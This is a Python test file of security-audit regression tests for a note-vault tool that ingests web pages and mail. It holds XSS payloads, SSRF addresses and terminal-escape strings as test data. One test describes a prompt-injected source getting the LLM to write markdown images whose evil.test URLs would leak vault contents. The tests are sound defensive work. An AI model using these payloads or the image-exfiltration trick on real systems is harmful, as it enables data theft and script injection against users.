"""Fixes from the pre-publication security audit. Each test names the attack it closes."""

import ssl
from datetime import date

import pytest

from esbi_cli import config as config_module
from esbi_cli.extract import ExtractedDoc
from esbi_cli.ingest.apply import _unique_source_path, save_raw
from esbi_cli.mail import imap
from esbi_cli.netguard import UnsafeURL, check_public_url
from esbi_cli.vault import safe_title, slugify

TODAY = date(2026, 10, 3)


def test_the_mail_connection_checks_the_servers_certificate_and_name(monkeypatch):
    """imaplib's default context does not verify: anyone on the network could read the app password."""
    seen = {}

    def fake_ssl(host, **kwargs):
        seen.update(kwargs)
        raise OSError("stop here")

    monkeypatch.setattr(imap.imaplib, "IMAP4_SSL", fake_ssl)
    client = imap.ImapMailClient("imap.example.test", "me@x.test", "pw", "Label")

    with pytest.raises(imap.MailError):
        client._connect()

    context = seen["ssl_context"]
    assert context.verify_mode == ssl.CERT_REQUIRED and context.check_hostname is True


def test_a_config_file_in_the_current_folder_is_never_picked_up():
    """`cd` into a cloned repo with a hostile ./config.toml and run `sb ask`: it could point the
    model at the attacker's server or the mailbox at the attacker's host."""
    assert all(p.is_absolute() for p in config_module.DEFAULT_CONFIG_PATHS)


def test_nat64_addresses_are_judged_by_the_ipv4_address_they_wrap():
    with pytest.raises(UnsafeURL):
        check_public_url("http://[64:ff9b::7f00:1]/")  # 127.0.0.1 behind a NAT64 prefix
    with pytest.raises(UnsafeURL):
        check_public_url("http://[64:ff9b::a00:1]/")  # 10.0.0.1
    check_public_url("http://[64:ff9b::808:808]/")  # 8.8.8.8 is public: allowed


def test_titles_carry_no_terminal_control_or_direction_override_characters():
    bad = [chr(0x1B), chr(0x07), chr(0x202E), chr(0x200B), chr(0x7F)]
    nasty = "Informe" + bad[0] + "[2J" + bad[1] + " final" + bad[2] + bad[3] + bad[4]

    cleaned = safe_title(nasty)
    assert cleaned.startswith("Informe") and not any(c in cleaned for c in bad)


def test_titles_in_other_scripts_get_distinct_names_instead_of_all_being_untitled():
    assert slugify("東京の話") != slugify("Привет мир") and "untitled" not in slugify("東京の話")
    assert slugify("東京の話") == slugify("東京の話")  # stable: the same title, the same name
    assert slugify("") == "untitled"


def test_two_sources_whose_titles_slug_alike_never_share_or_overwrite_a_raw_file(vault):
    first = ExtractedDoc("東京の話", "texto uno " * 30, "paper", None, pdf_bytes=b"%PDF-1.4 uno")
    second = ExtractedDoc("東京の話", "texto dos " * 30, "paper", None, pdf_bytes=b"%PDF-1.4 dos")

    a = save_raw(vault, first, "東京の話", TODAY)
    b = save_raw(vault, second, "東京の話", TODAY)

    assert a != b
    assert a.with_suffix(".pdf").read_bytes() == b"%PDF-1.4 uno"  # not overwritten by the second
    assert b.with_suffix(".pdf").read_bytes() == b"%PDF-1.4 dos"
    assert "texto uno" in a.read_text() and "texto dos" in b.read_text()
    assert save_raw(vault, first, "東京の話", TODAY) == a  # the same source again: the same file


@pytest.mark.parametrize("title", ["Home", "index", "Lint", "2026-10-03"])
def test_a_source_cannot_take_the_name_of_a_special_page_or_a_daily_note(vault, title):
    path = _unique_source_path(vault, title, "https://x.test/a")

    assert path.stem != title  # [[Home]] and [[2026-10-03]] keep meaning the real ones


# ---- hostile text that reaches a note or the exported site ------------------------------------

HOSTILE = "<script>alert(1)</script><img src=x onerror=alert(2)> [click](javascript:alert(3))"


def test_the_exported_site_never_runs_html_that_a_source_got_into_a_note(vault, tmp_path):
    """Stored XSS: a note is written from untrusted pages and mail, and the export is a website."""
    from conftest import add_source

    from esbi_cli.export import export_site
    from esbi_cli.vault import Page

    add_source(
        vault,
        "Fuente hostil",
        body=f"# Fuente\n\n{HOSTILE}\n\n[[Otra|<img src=y onerror=alert(4)>]]",
    )
    vault.write_page(
        Page(vault.page_path("concepts", "Otra"), {"type": "concept", "title": "Otra"}, "# Otra")
    )
    out = tmp_path / "site"

    export_site(vault, out)

    page = (out / "sources" / "fuente-hostil.html").read_text(encoding="utf-8")
    assert "<script>alert" not in page and "<img src=x" not in page and "<img src=y" not in page
    assert 'href="javascript:' not in page
    assert "&lt;script&gt;alert(1)&lt;/script&gt;" in page  # the text is shown, not executed


def test_the_diagram_script_is_pinned_to_one_exact_version(vault, tmp_path):
    from conftest import add_source

    from esbi_cli.export import export_site

    add_source(vault, "Con diagrama", body='# D\n\n```mermaid\ngraph LR\n  a["A"] --> b["B"]\n```')
    out = tmp_path / "site"
    export_site(vault, out)

    page = (out / "sources" / "con-diagrama.html").read_text(encoding="utf-8")
    assert (
        "mermaid@10." in page and "mermaid@10/" not in page
    )  # a floating major version is a supply-chain hole


def test_a_message_id_cannot_carry_markup_into_the_note():
    from test_mail_convert import raw_email

    from esbi_cli.mail.convert import email_to_clip

    clip = email_to_clip(raw_email(msgid='<"<img src=x onerror=alert(1)>"@evil.test>'))

    assert not any(c in clip.source for c in '<>" \t') and len(clip.source) < 200
    assert "<img" not in clip.content


def test_a_page_image_cannot_break_out_of_its_markdown_into_html(vault, cfg):
    from conftest import FakeLLM, make_plan

    from esbi_cli.ingest.pipeline import ingest

    doc = ExtractedDoc(
        "Con imagen",
        "Un artículo sobre agentes de código. " * 30,
        "article",
        "https://x.test/img",
        image_links=[("pie <img src=x onerror=alert(1)>", "https://x.test/a b.png")],
    )

    result = ingest("x", vault=vault, llm=FakeLLM(make_plan()), cfg=cfg, extractor=lambda _: doc)

    body = vault.read_page(result.applied.source_path).body
    figures = body.split("## Figuras")[1].split("##")[0]
    assert "<img" not in body and "<" not in figures  # alt text is inert, never markup
    assert "(https://x.test/a%20b.png)" in figures


def test_text_the_model_writes_cannot_load_remote_images_or_inject_html_into_a_note(vault, cfg):
    """A prompt-injected source can make the model write an image whose address carries wiki text out
    when the note is opened, or raw HTML."""
    from conftest import FakeLLM, make_plan

    from esbi_cli.ingest.pipeline import ingest

    evil = "![x](https://evil.test/p.png?d=SECRETO) <img src=https://evil.test/q> texto normal"
    plan = make_plan(
        summary=evil + " con bastante texto para ser un resumen válido.",
        key_points=[evil, "otro punto"],
        concepts=[{"title": "Idea", "aliases": [], "description": evil + " y más descripción."}],
        entities=[],
    )
    doc = ExtractedDoc(
        "Fuente", "Un artículo sobre agentes de código. " * 30, "article", "https://x.test/q"
    )

    result = ingest("x", vault=vault, llm=FakeLLM(plan), cfg=cfg, extractor=lambda _: doc)

    for page in (
        vault.read_page(result.applied.source_path),
        vault.read_page(vault.page_path("concepts", "Idea")),
    ):
        assert "![" not in page.body and "<img" not in page.body
        assert "texto normal" in page.body  # the harmless part stays
        assert "![" not in str(page.meta.get("summary", ""))


def test_a_mail_whose_file_cannot_be_written_is_reported_once_and_does_not_stop_the_run(
    vault, monkeypatch
):
    """A name the disk refuses (too long on ext4) raised OSError out of the fetch: every run died on
    the same mail, and the mail after it was never read."""
    from conftest import FakeMailClient
    from test_mail_convert import raw_email

    from esbi_cli.mail import fetch

    real_save = fetch._save

    def refuse_bad(vault, inbox, clip):
        if "bad" in clip.source:
            raise OSError(63, "File name too long")
        return real_save(vault, inbox, clip)

    monkeypatch.setattr(fetch, "_save", refuse_bad)
    good = raw_email(subject="Normal", msgid="<ok@x.test>")
    bad = raw_email(subject="Largo", msgid="<bad@x.test>")

    first = fetch.fetch_mail(FakeMailClient(("1", bad), ("2", good)), vault)
    second = fetch.fetch_mail(FakeMailClient(("1", bad), ("2", good)), vault)

    assert (first.saved, first.failed) == (1, 1) and (second.saved, second.failed) == (0, 0)


def test_a_mail_subject_makes_a_short_file_name():
    from test_mail_convert import raw_email

    from esbi_cli.mail.convert import email_to_clip

    clip = email_to_clip(raw_email(subject="漢" * 100))

    assert len(clip.filename) < 80


def test_an_item_that_keeps_killing_the_run_is_parked_instead_of_retried_forever(tmp_path):
    """A PDF that exhausts memory kills the process: recover() put it back with no attempt counted."""
    from esbi_cli.queue import Queue

    path = tmp_path / "queue.sqlite3"
    for _ in range(3):
        queue = Queue(path)
        if not queue.items("queued") and not queue.items("processing"):
            queue.add("https://x.test/poison", origin="inbox")
        queue.recover()
        queue.claim(1)  # the process dies here, before complete/fail

    queue = Queue(path)
    queue.recover()

    assert queue.counts() == {"failed": 1}


def test_a_page_larger_than_the_cap_is_refused_not_loaded_into_memory(monkeypatch):
    import httpx

    from esbi_cli import netguard

    monkeypatch.setattr(netguard, "MAX_BYTES", 1000)
    handler = lambda request: httpx.Response(200, content=b"x" * 5000)  # noqa: E731
    client = httpx.Client(transport=httpx.MockTransport(handler))

    with pytest.raises(netguard.UnsafeURL, match="larger"):
        netguard.safe_get("https://ok.test/big", client=client, resolver=_public)


def test_a_figure_is_rendered_at_a_bounded_size_however_large_its_page_is():
    from esbi_cli.extract.pdf import _dpi_for

    assert _dpi_for(300, 200) == 150  # normal figure: unchanged
    assert 150 * 14400 / 72 > 3000 > 14400 * _dpi_for(14400, 14400) / 72 - 1  # huge page: clamped


def _public(host, port, *args, **kwargs):
    return [(2, 1, 6, "", ("93.184.216.34", port or 0))]


def test_a_clamped_figure_dpi_is_a_whole_number_because_pymupdf_requires_one():
    import pymupdf

    from esbi_cli.extract.pdf import _dpi_for

    dpi = _dpi_for(14400, 14400)

    assert isinstance(dpi, int) and dpi >= 1
    page = pymupdf.open().new_page(width=200, height=200)
    assert page.get_pixmap(dpi=dpi).tobytes("png")  # the real call accepts it
